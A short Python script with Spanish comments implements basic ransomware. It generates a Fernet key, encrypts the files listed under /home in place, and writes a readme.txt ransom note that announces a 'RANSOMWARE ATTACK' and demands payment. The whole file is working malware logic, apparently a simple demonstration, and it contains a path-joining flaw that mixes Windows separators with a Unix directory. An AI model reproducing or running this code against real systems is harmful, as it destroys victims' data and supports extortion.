from cryptography.fernet import Fernet # type: ignore
import os


# Esta función genera una nueva clave de encriptación y la guarda en un archivo 'key.key'.
def generar_key():
    # Generamos una nueva clave de encriptación.
    key = Fernet.generate_key()
    with open('key.key', 'wb') as key_file:
        # Escribimos la clave generada en el archivo.
        key_file.write(key)


# Esta función carga la clave de encriptación almacenada en un archivo 'key.key'.
def cargar_key():
    return open('key.key', 'rb').read()


# Esta función encripta una lista de archivos utilizando la clave proporcionada.
def encrypt(items, key):
    f = Fernet(key)
    for item in items:
        with open(item, 'rb') as file:
            file_data = file.read()
        # Encriptamos los datos.
        encrypted_data = f.encrypt(file_data)
        with open(item, 'wb') as file:
            file.write(encrypted_data)


if __name__ == '__main__':

    # Definimos el directorio cuyo contenido será encriptado.
    path_to_encrypt = '/home'

    # Listamos todos los elementos en el directorio especificado.
    items = os.listdir(path_to_encrypt)

    # Creamos una lista de rutas completas para cada elemento.
    full_path = [path_to_encrypt+'\\'+items for items in items]

    # Generamos la clave y la cargamos desde el archivo 'key.key'.
    generar_key()
    key = cargar_key()

    # Encripta los archivos en la lista 'full_path' utilizando la clave cargada
    encrypt(full_path, key)

    # Creamos un archivo 'readme.txt' en el directorio especificado con un mensaje de ransomware.
    with open(path_to_encrypt+'\\'+'readme.txt', 'w') as file:
        file.write('Ficheros encriptados, ATAQUE RANSOMWARE\n')
        file.write('Debes pagar el rescate de tu información')